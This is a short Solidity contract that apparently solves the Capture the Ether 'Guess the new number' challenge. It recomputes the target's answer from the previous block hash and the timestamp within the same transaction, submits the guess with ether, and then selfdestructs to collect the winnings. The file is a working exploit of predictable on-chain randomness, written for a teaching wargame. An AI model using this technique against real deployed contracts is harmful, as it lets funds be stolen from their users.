pragma solidity ^0.4.21;

//                        *****SOLVED***** 
//  https://capturetheether.com/challenges/lotteries/guess-the-new-number/
//          ^^^^^^^^^^^^ CAPTURE ETH HERE ^^^^^^^^^^^^^^

contract CaptureTheEther {
    
    function capture() public payable {
        GuessTheNewNumberChallenge number = GuessTheNewNumberChallenge(/* INSERT CONTRACT ADDRESS */);
        
        // Copy the answer variable from guess() function to predict the hash value, then pass it through the function
        number.guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now))) 
        
        selfdestruct(msg.sender); // Destroy this contract once the ether gets transfered
    }
    
    function() public payable {
        
    }
}
